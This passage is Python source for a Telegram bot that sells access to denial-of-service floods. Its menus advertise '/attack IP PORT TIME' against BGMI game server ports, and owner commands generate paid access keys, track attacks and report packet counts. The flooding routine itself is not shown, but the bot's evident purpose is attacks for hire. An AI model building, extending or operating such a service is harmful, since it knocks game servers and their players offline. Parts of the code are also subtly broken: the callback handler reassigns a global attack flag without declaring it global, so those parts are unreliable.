async def add_video_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    if not msg.reply_to_message or not msg.reply_to_message.video:
        return await msg.reply_text(
            "⎘ ADD VIDEO\n\n"
            "Reply to a video with:\n"
            "`/addvideo`"
        )
    
    try:
        path = await msg.reply_to_message.download()
        vid = add_vid(path)
        await msg.reply_text(f"✅ VIDEO ADDED!\n\n🆔 ID: {vid}\n📹 Total: {len(get_vids())}")
    except Exception as e:
        await msg.reply_text(f"❌ Error: {e}")

@app.on_message(filters.command("videos") & filters.private)
async def list_videos_cmd(client, msg):
    vids = get_vids()
    if not vids:
        return await msg.reply_text("📭 No videos added yet!")
    
    text = f"📹 VIDEOS ({len(vids)})\n\n"
    for v in vids[:10]:
        text += f"#{v['id']} {v['name'][:30]}\n"
    
    await msg.reply_text(text)

@app.on_message(filters.command("clearvideos") & filters.private)
async def clear_videos_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    n = clear_vids()
    await msg.reply_text(f"🗑️ {n} videos cleared!")

# ═══════════════ SETTINGS COMMANDS ═══════════════
@app.on_message(filters.command("setallstickertime") & filters.private)
async def set_all_sticker_time_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    parts = msg.text.split()
    if len(parts) != 2:
        return await msg.reply_text("Use: /setallstickertime seconds")
    
    try:
        duration = int(parts[1])
        if duration < 1:
            return await msg.reply_text("❌ Minimum 1 second!")
        
        save_settings(sticker_time=duration)
        await msg.reply_text(f"✅ ALL STICKERS TIME SET TO {duration}s")
    except:
        await msg.reply_text("❌ Invalid input! Use a number.")

@app.on_message(filters.command("setvideodelay") & filters.private)
async def set_video_delay_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    parts = msg.text.split()
    if len(parts) != 2:
        return await msg.reply_text("Use: /setvideodelay seconds")
    
    try:
        delay = int(parts[1])
        if delay < 1:
            return await msg.reply_text("❌ Minimum 1 second!")
        
        save_settings(video_delay=delay)
        await msg.reply_text(f"✅ VIDEO DELAY SET TO {delay}s")
    except:
        await msg.reply_text("❌ Invalid input! Use a number.")

# ═══════════════ KEY COMMANDS ═══════════════
@app.on_message(filters.command("genkey") & filters.private)
async def genkey_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    parts = msg.text.split()
    if len(parts) != 3:
        return await msg.reply_text(
            "⚿ GENKEY\n\n"
            "Use: /genkey NAME TIME\n"
            "Examples:\n"
            "/genkey Premium 7d\n"
            "/genkey VIP 30m\n"
            "Units: m=min, h=hour, d=day, w=week, mo=month"
        )
    
    name = parts[1]
    time_str = parts[2]
    key_code, duration = create_key(name, time_str)
    
    if key_code:
        await msg.reply_text(
            f"⚿ KEY GENERATED\n\n"
            f"🪪 Name: {name}\n"
            f"⏱️ Duration: {duration}\n"
            f"🔑 Key: `{key_code}`\n\n"
            f"📋 /redeem {key_code}"
        )
    else:
        await msg.reply_text("❌ Invalid time format!")

@app.on_message(filters.command("admin_keys") & filters.private)
async def admin_keys_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    keys = get_keys()
    active = [k for k, v in keys.items() if v["active"]]
    used = [k for k, v in keys.items() if not v["active"]]
    
    await msg.reply_text(
        f"⌘ ALL KEYS\n\n"
        f"🟢 Active: {len(active)}\n"
        f"🔴 Used: {len(used)}\n"
        f"📊 Total: {len(keys)}"
    )

@app.on_message(filters.command("admin_stats") & filters.private)
async def admin_stats_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    vids = get_vids()
    users = get_users()
    
    await msg.reply_text(
        f"⎙ STATS\n\n"
        f"📹 Videos: {len(vids)}\n"
        f"💎 Premium: {len(users.get('premium', []))}\n"
        f"🔑 Key Users: {len(users.get('keys', {}))}\n"
        f"⚡ Attack: {'🟢 On' if attacking else '💤 Idle'}\n\n"
        f"⚙️ Settings:\n"
        f"⏱️ Sticker Time: {get_sticker_display_time()}s\n"
        f"⏱️ Video Delay: {get_video_delay_time()}s"
    )

@app.on_message(filters.command("admin_clear") & filters.private)
async def admin_clear_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    removed = remove_expired()
    await msg.reply_text(f"↺ {removed} expired keys removed!")

# ═══════════════ CALLBACK QUERY HANDLER ═══════════════
@app.on_callback_query()
async def callback_handler(client, cb: CallbackQuery):
    data = cb.data
    uid = cb.from_user.id
    is_owner = (uid == OWNER_ID)
    
    # ═══════ SEPARATOR ═══════
    if data == "sep":
        await cb.answer()
        return
    
    # ═══════ MAIN MENU ═══════
    if data == "menu":
        await cb.answer("⌂ Main Menu")
        user = cb.from_user
        info = get_user_info(uid)
        kb = main_menu_kb(is_owner)
        
        text = f"""
💀 BGMI ATTACK BOT 💀

{LINE}
👤 {user.first_name}
🆔 {uid}
💳 {info['type']}
{LINE}
⚡ {info['threads']} Threads
⏱️ {info['max_time']}s Max Time
📹 {len(get_vids())} Videos
{LINE}
⚔️ /attack IP PORT TIME
📋 /attack 1.2.3.4 8080 600
🎮 BGMI Ports: 7000-15000
{LINE}
🔽 SELECT OPTION:
"""
        await cb.message.edit_text(text, reply_markup=kb)
        return
    
    # ═══════ ATTACK MENU ═══════
    if data == "attack_menu":
        access, a_type = check_access(uid)
        if not access:
            await cb.answer("🔒 Access Denied!", show_alert=True)
            return
        
        info = get_user_info(uid)
        text = f"""
💀 ATTACK MENU

{LINE}
⚔️ /attack IP PORT TIME
📋 /attack 1.2.3.4 8080 600
{LINE}
🎮 BGMI: 7000-15000
⚡ {info['threads']} Threads
⏱️ {info['max_time']}s Max (10 Minutes)
💳 {a_type}
"""
        await cb.message.edit_text(text, reply_markup=back_to_menu_kb(is_owner))
        await cb.answer("⚔ Attack Menu")
        return
    
    # ═══════ INFO MENU ═══════
    if data == "info_menu":
        info = get_user_info(uid)
        history = get_user_history(uid)
        
        text = f"""
ⓘ USER INFO

{LINE}
👤 {cb.from_user.first_name}
🆔 {uid}
💳 {info['type']}
{LINE}
▓ ATTACK HISTORY:
"""
        if history:
            for h in history[-5:]:
                try:
                    t = datetime.fromisoformat(h['time']).strftime('%d %b %I:%M %p')
                    text += f"• {t} - {h['action']}\n"
                except: pass
        else:
            text += "• No attacks yet!\n"
        
        text += f"\n📹 Videos: {len(get_vids())}"
        await cb.message.edit_text(text, reply_markup=back_to_menu_kb(is_owner))
        await cb.answer("ⓘ User Info")
        return
    
    # ═══════ REDEEM MENU ═══════
    if data == "redeem_menu":
        access, a_type = check_access(uid)
        if access:
            info = get_user_info(uid)
            await cb.message.edit_text(
                f"✅ ACCESS ACTIVE\n\n{LINE}\n💳 {a_type}\n⏳ {info.get('remaining', 'N/A')}\n{LINE}\nUse /attack to start!",
                reply_markup=back_to_menu_kb(is_owner)
            )
        else:
            await cb.message.edit_text(
                f"⚿ REDEEM KEY\n\n{LINE}\n📋 /redeem KEY\n🔑 /redeem BGMI-XXXX-XXXX-XXXX\n{LINE}\n📲 @FathersOfCreater\n\n⏱️ 30m | 24h | 7d | 2w | 1mo",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🪪 About Redeem ♡", callback_data="redeem_popup")],
                    [InlineKeyboardButton("📲 Contact Owner", url=OWNER_LINK)],
                    [InlineKeyboardButton("⌂ MAIN MENU", callback_data="menu")]
                ])
            )
        await cb.answer("⚿ Redeem Menu")
        return
    
    # ═══════ REDEEM POPUP ═══════
    if data == "redeem_popup":
        await cb.answer(
            "🪪 About Redeem ♡\n\n"
            "🔑 How To Redeem Key?\n\n"
            "1️⃣ Get Key From Admin\n"
            "📲 @FathersOfCreater\n\n"
            "2️⃣ Use Command:\n"
            "/redeem YOUR_KEY\n\n"
            "3️⃣ Example:\n"
            "/redeem BGMI-XXXX-XXXX-XXXX\n\n"
            "⏱️ Durations:\n"
            "30m • 1h • 24h • 7d • 2w • 1mo\n\n"
            "💎 Premium = Power!",
            show_alert=True
        )
        return
    
    # ═══════ COMMANDS MENU ═══════
    if data == "commands_menu":
        text = get_commands_list(is_owner)
        await cb.message.edit_text(text, reply_markup=back_to_menu_kb(is_owner))
        await cb.answer("📝 Commands List")
        return
    
    # ═══════ STATUS BUTTON ═══════
    if data == "status_btn":
        if attacking:
            e = time.time() - ainfo['start']
            await cb.answer(
                f"🟢 ATTACKING\n"
                f"⏱️ {int(e)}s\n"
                f"📦 {attacker.pkts:,} pkts",
                show_alert=True
            )
        else:
            await cb.answer("💤 IDLE\n\n✅ No attack running", show_alert=True)
        return
    
    # ═══════ STOP ATTACK ═══════
    if data == "stop_attack":
        if not check_access(uid)[0]:
            await cb.answer("🔒 Access Denied!", show_alert=True)
            return
        
        if attacking and (uid == attack_user or uid == OWNER_ID):
            stop_sticker = get_stop_sticker()
            if stop_sticker:
                try:
                    await cb.message.reply_sticker(stop_sticker)
                except:
                    pass
            
            attacker.on = False
            attacking = False
            
            await cb.answer("✅ Attack Stopped!", show_alert=True)
            await cb.message.edit_text(
                f"✅ ATTACK TERMINATED\n\n"
                f"╔══════════════════════════╗\n"
                f"║  ✅ Target Neutralized\n"
                f"║  📦 {attacker.pkts:,} Packets\n"
                f"║  🛑 Attack Stopped\n"
                f"╚══════════════════════════╝\n\n"
                f"🔄 /attack IP PORT TIME"
            )
        else:
            await cb.answer("💤 No attack running!", show_alert=True)
        return
    
    # ═══════ ADMIN MENU ═══════
    if data == "admin_menu":
        if not is_owner:
            await cb.answer("Owner only!", show_alert=True)
            return
        await cb.message.edit_text(
            f"⚜ ADMIN PANEL\n\n{LINE}\n🔽 Select:",
            reply_markup=admin_kb()
        )
        await cb.answer("⚜ Admin Panel")
        return
    
    # ═══════ ADMIN AUTO ═══════
    if data == "admin_auto":
        if not is_owner:
            await cb.answer("Owner only!", show_alert=True)
            return
        await cb.message.edit_text(
            f"⚜ AUTO GEN KEY\n\n{LINE}\n🔽 Select Duration:",
            reply_markup=auto_key_kb()
        )
        await cb.answer("⚜ Auto Generate Key")
        return
    
    # ═══════ ADMIN ADD KEY ═══════
    if data == "admin_addkey":
        if not is_owner:
            await cb.answer("Owner only!", show_alert=True)
            return
        await cb.answer(
            f"⚿ ADD KEY\n\n"
            f"Use: /genkey NAME TIME\n\n"
            f"Examples:\n"
            "/genkey Test 30m\n"
            "/genkey VIP 24h\n"
            "/genkey Premium 7d\n\n"
            f"Units: m=min, h=hour, d=day, w=week, mo=month",
            show_alert=True
        )
        return
    
    # ═══════ ADMIN KEYS ═══════
    if data == "admin_keys":
        if not is_owner:
            await cb.answer("Owner only!", show_alert=True)
            return
        keys = get_keys()
        active = [k for k, v in keys.items() if v["active"]]
        used = [k for k, v in keys.items() if not v["active"]]
        await cb.message.edit_text(
            f"⌘ ALL KEYS\n\n{LINE}\n"
            f"🟢 Active: {len(active)}\n"
            f"🔴 Used: {len(used)}\n"
            f"📊 Total: {len(keys)}\n{LINE}",
            reply_markup=admin_kb()
        )
        await cb.answer("⌘ All Keys")
        return
    
    # ═══════ ADMIN STATS ═══════
    if data == "admin_stats":
        if not is_owner:
            await cb.answer("Owner only!", show_alert=True)
            return
        vids = get_vids()
        users = get_users()
        await cb.message.edit_text(
            f"⎙ STATS\n\n{LINE}\n"
            f"📹 Videos: {len(vids)}\n"
            f"💎 Premium: {len(users.get('premium', []))}\n"
            f"🔑 Key Users: {len(users.get('keys', {}))}\n"
            f"⚡ Attack: {'🟢 On' if attacking else '💤 Idle'}\n"
            f"{LINE}\n"
            f"⚙️ Settings:\n"
            f"⏱️ Sticker Time: {get_sticker_display_time()}s\n"
            f"⏱️ Video Delay: {get_video_delay_time()}s",
            reply_markup=admin_kb()
        )
        await cb.answer("⎙ Statistics")
        return
    
    # ═══════ ADMIN CLEAR ═══════
    if data == "admin_clear":
        if not is_owner:
            await cb.answer("Owner only!", show_alert=True)
            return
        removed = remove_expired()
        await cb.answer(f"↺ {removed} expired removed!", show_alert=True)
        return
    
    # ═══════ VIDEO MANAGER ═══════
    if data == "video_menu":
        if not is_owner:
            await cb.answer("Owner only!", show_alert=True)
            return
        vids = get_vids()
        await cb.message.edit_text(
            f"▶ VIDEO MANAGER\n\n"
            f"🔹 Total Videos: {len(vids)}\n"
            f"🔹 Commands:\n"
            f"• /addvideo - Reply to video\n"
            f"• /delvideo ID - Delete by ID\n"
            f"• /videos - List all videos\n"
            f"• /clearvideos - Clear all\n"
            f"• /setvideodelay seconds - Set video delay\n\n"
            f"⏱️ Video Delay: {get_video_delay_time()}s\n"
            f"✨ Videos appear randomly in welcome!",
            reply_markup=video_kb()
        )
        await cb.answer("▶ Video Manager")
        return
    
    # ═══════ VIDEO BUTTONS ═══════
    if data == "v_add":
        if not is_owner:
            await cb.answer("Owner only!", show_alert=True)
            return
        await cb.message.edit_text(
            f"⎘ ADD VIDEO\n\n"
            f"Reply to a video with:\n"
            "`/addvideo`",
            reply_markup=video_kb()
        )
        await cb.answer("⎘ Add Video")
        return
    
    if data == "v_del":
        if not is_owner:
            await cb.answer("Owner only!", show_alert=True)
            return
        vids = get_vids()
        if not vids:
            await cb.answer("No videos to delete!", show_alert=True)
            return
        await cb.message.edit_text(
            f"⌫ DELETE VIDEO\n\n"
            f"Use: /delvideo ID\n\n"
            f"Get ID from /videos command.",
            reply_markup=video_kb()
        )
        await cb.answer("⌫ Delete Video")
        return
    
    if data == "v_list":
        if not is_owner:
            await cb.answer("Owner only!", show_alert=True)
            return
        vids = get_vids()
        if not vids:
            await cb.answer("No videos added yet!", show_alert=True)
            return
        text = f"⌘ VIDEO LIST\n\n"
        for v in vids[:15]:
            text += f"#{v['id']} {v['name'][:30]}\n"
        text += f"\n🔹 Total: {len(vids)}"
        text += f"\n⏱️ Video Delay: {get_video_delay_time()}s"
        await cb.message.edit_text(text, reply_markup=video_kb())
        await cb.answer("⌘ Video List")
        return
    
    if data == "v_clear":
        if not is_owner:
            await cb.answer("Owner only!", show_alert=True)
            return
        n = clear_vids()
        await cb.answer(f"🗑️ {n} videos cleared!", show_alert=True)
        await cb.message.edit_text(
            f"⎚ VIDEOS CLEARED\n\n"
            f"🔹 Total Videos: 0",
            reply_markup=video_kb()
        )
        return
    
    if data == "v_help":
        await cb.message.edit_text(
            f"❓ VIDEO HELP\n\n"
            f"{LINE}\n"
            f"📤 Add: Reply + /addvideo\n"
            f"📋 List: /videos\n"
            f"🗑️ Delete: /delvideo ID\n"
            f"🧹 Clear: /clearvideos\n"
            f"⏱️ Set Delay: /setvideodelay seconds\n"
            f"{LINE}",
            reply_markup=video_kb()
        )
        await cb.answer("❓ Video Help")
        return
    
    # ═══════ EMOJI MANAGER ═══════
    if data == "emoji_menu":
        if not is_owner:
            await cb.answer("Owner only!", show_alert=True)
            return
        emojis = get_all_emojis()
        await cb.message.edit_text(
            f"★ EMOJI MANAGER\n\n"
            f"🔹 Total Emojis: {len(emojis)}\n"
            f"🔹 Commands:\n"
            f"• /addemoji - Reply to premium emoji\n"
            f"• /removeemoji index - Remove by index\n"
            f"• /listemojis - List all emojis\n"
            f"• /resetemojis - Reset all\n\n"
            f"✨ Emojis appear randomly in welcome!",
            reply_markup=emoji_kb()
        )
        await cb.answer("★ Emoji Manager")
        return
    
    # ═══════ EMOJI BUTTONS ═══════
    if data == "e_add":
        if not is_owner:
            await cb.answer("Owner only!", show_alert=True)
            return
        await cb.message.edit_text(
            f"⎘ ADD EMOJI\n\n"
            f"Reply to a premium emoji with:\n"
            "`/addemoji`",
            reply_markup=emoji_kb()
        )
        await cb.answer("⎘ Add Emoji")
        return
    
    if data == "e_remove":
        if not is_owner:
            await cb.answer("Owner only!", show_alert=True)
            return
        emojis = get_all_emojis()
        if not emojis:
            await cb.answer("No emojis to remove!", show_alert=True)
            return
        await cb.message.edit_text(
            f"⌫ REMOVE EMOJI\n\n"
            f"Use: /removeemoji index\n\n"
            f"Get index from /listemojis command.",
            reply_markup=emoji_kb()
        )
        await cb.answer("⌫ Remove Emoji")
        return
    
    if data == "e_list":
        if not is_owner:
            await cb.answer("Owner only!", show_alert=True)
            return
        emojis = get_all_emojis()
        if not emojis:
            await cb.answer("No emojis added yet!", show_alert=True)
            return
        text = f"⌘ EMOJI LIST\n\n"
        for i, emoji_id in enumerate(emojis, 1):
            text += f"**{i}.** `{emoji_id[:30]}...`\n"
        text += f"\n🔹 Total: {len(emojis)}"
        await cb.message.edit_text(text, reply_markup=emoji_kb())
        await cb.answer("⌘ Emoji List")
        return
    
    if data == "e_reset":
        if not is_owner:
            await cb.answer("Owner only!", show_alert=True)
            return
        reset_emojis()
        await cb.answer("🔄 All emojis reset!", show_alert=True)
        await cb.message.edit_text(
            f"↺ EMOJIS RESET\n\n"
            f"🔹 Total Emojis: 0",
            reply_markup=emoji_kb()
        )
        return
    
    # ═══════ STICKER MANAGER ═══════
    if data == "sticker_menu":
        if not is_owner:
            await cb.answer("Owner only!", show_alert=True)
            return
        stickers = get_all_stickers()
        await cb.message.edit_text(
            f"❄ STICKER MANAGER\n\n"
            f"🔹 Total Stickers: {len(stickers)}\n"
            f"🔹 Commands:\n"
            f"• /addsticker - Reply to sticker\n"
            f"• /removesticker index - Remove by index\n"
            f"• /liststickers - List all stickers\n"
            f"• /resetstickers - Reset all\n"
            f"• /setstickertime index seconds - Set single\n"
            f"• /setallstickertime seconds - Set ALL\n\n"
            f"⏱️ Default Time: {get_sticker_display_time()}s\n"
            f"⏱️ Video Delay: {get_video_delay_time()}s\n"
            f"✨ Stickers appear randomly in welcome!",
            reply_markup=sticker_kb()
        )
        await cb.answer("❄ Sticker Manager")
        return
    
    # ═══════ STICKER BUTTONS ═══════
    if data == "s_add":
        if not is_owner:
            await cb.answer("Owner only!", show_alert=True)
            return
        await cb.message.edit_text(
            f"⎘ ADD STICKER\n\n"
            f"Reply to a sticker with:\n"
            "`/addsticker`",
            reply_markup=sticker_kb()
        )
        await cb.answer("⎘ Add Sticker")
        return
    
    if data == "s_remove":
        if not is_owner:
            await cb.answer("Owner only!", show_alert=True)
            return
        stickers = get_all_stickers()
        if not stickers:
            await cb.answer("No stickers to remove!", show_alert=True)
            return
        await cb.message.edit_text(
            f"⌫ REMOVE STICKER\n\n"
            f"Use: /removesticker index\n\n"
            f"Get index from /liststickers command.",
            reply_markup=sticker_kb()
        )
        await cb.answer("⌫ Remove Sticker")
        return
    
    if data == "s_list":
        if not is_owner:
            await cb.answer("Owner only!", show_alert=True)
            return
        stickers = get_all_stickers()
        if not stickers:
            await cb.answer("No stickers added yet!", show_alert=True)
            return
        text = f"⌘ STICKER LIST\n\n"
        for i, sticker_id in enumerate(stickers, 1):
            text += f"**{i}.** `{sticker_id[:25]}...`\n"
        text += f"\n🔹 Total: {len(stickers)}"
        text += f"\n\n📋 Settings: Sticker Time: {get_sticker_display_time()}s | Video Delay: {get_video_delay_time()}s"
        await cb.message.edit_text(text, reply_markup=sticker_kb())
        await cb.answer("⌘ Sticker List")
        return
    
    if data == "s_reset":
        if not is_owner:
            await cb.answer("Owner only!", show_alert=True)
            return
        reset_stickers()
        await cb.answer("🔄 All stickers reset!", show_alert=True)
        await cb.message.edit_text(
            f"↺ STICKERS RESET\n\n"
            f"🔹 Total Stickers: 0",
            reply_markup=sticker_kb()
        )
        return
    
    # ═══════ AUTO KEY GENERATION ═══════
    auto_keys = {
        "ak_20m": ("20min", "20m"), "ak_40m": ("40min", "40m"), "ak_60m": ("60min", "60m"),
        "ak_1d": ("1day", "1d"), "ak_3d": ("3day", "3d"), "ak_7d": ("7day", "7d"),
        "ak_15d": ("15day", "15d"), "ak_23d": ("23day", "23d"), "ak_30d": ("30day", "30d"),
        "ak_1mo": ("1month", "1mo"), "ak_2mo": ("2month", "2mo"), "ak_3mo": ("3month", "3mo"),
    }
    
    if data in auto_keys:
        if not is_owner:
            await cb.answer("Owner only!", show_alert=True)
            return
        name, time_str = auto_keys[data]
        key_code, duration = create_key(name, time_str)
        if key_code:
            await cb.message.edit_text(
                f"⚿ KEY GENERATED\n\n{LINE}\n🪪 {name}\n⏱️ {duration}\n🔑 {key_code}\n{LINE}\n\n📋 /redeem {key_code}",
                reply_markup=auto_key_kb()
            )
            await cb.answer("✅ Key Generated!")
        else:
            await cb.answer("❌ Failed!", show_alert=True)
        return

# ═══════════════ AUTO EXPIRE ═══════════════
async def auto_expire():
    while True:
        await asyncio.sleep(300)
        remove_expired()

# ═══════════════ INIT ═══════════════
for f, d in [
    (VIDEO_DB, []), 
    (USERS_DB, {"premium": [], "keys": {}}), 
    (KEYS_DB, {}), 
    (BLOCKED_DB, []), 
    (HISTORY_DB, {}), 
    (STICKER_DB, {"stickers": []}),
    (EMOJI_DB, {"emojis": []}),
    (STICKER_TIME_DB, {}),
    (SETTINGS_DB, {"sticker_time": DEFAULT_STICKER_TIME, "video_delay": DEFAULT_VIDEO_DELAY}),
    (STOP_STICKER_DB, {"sticker_id": None})
]:
    if not os.path.exists(f): jsave(f, d)

os.makedirs("downloads", exist_ok=True)
asyncio.get_event_loop().create_task(auto_expire())

print("""
╔══════════════════════════════════════╗
║  💀 BGMI ATTACK BOT - ULTRA PRO     ║
║  ✅ ALL COMMANDS WORKING            ║
║  ✅ ALL BUTTONS WORKING             ║
║  ✅ NO CONFLICTS                    ║
║  ✅ BOT REPLYING PROPERLY           ║
╚══════════════════════════════════════╝
✅ Bot Ready!
""")

if __name__ == "__main__":
    app.run()
